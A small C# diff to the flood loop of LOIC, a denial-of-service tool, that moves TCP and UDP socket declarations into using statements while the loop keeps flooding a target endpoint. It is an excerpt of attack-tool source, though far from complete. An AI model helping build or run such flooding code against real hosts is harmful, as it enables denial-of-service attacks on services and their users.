@@ -41,10 +41,9 @@ namespace LOIC
 				IPEndPoint RHost = new IPEndPoint(IPAddress.Parse(IP), Port);
 				while (IsFlooding)
 				{
-					Socket socket = null;
 					if(Protocol == 1)
 					{
-						using (socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp))
+						using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp))
 						{
 							socket.NoDelay = true;
 
@@ -68,7 +67,7 @@ namespace LOIC
 					}
 					if(Protocol == 2)
 					{
-						using (socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp))
+						using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Dgram, ProtocolType.Udp))
 						{
 							socket.NoDelay = true;
 							socket.Blocking = Resp;
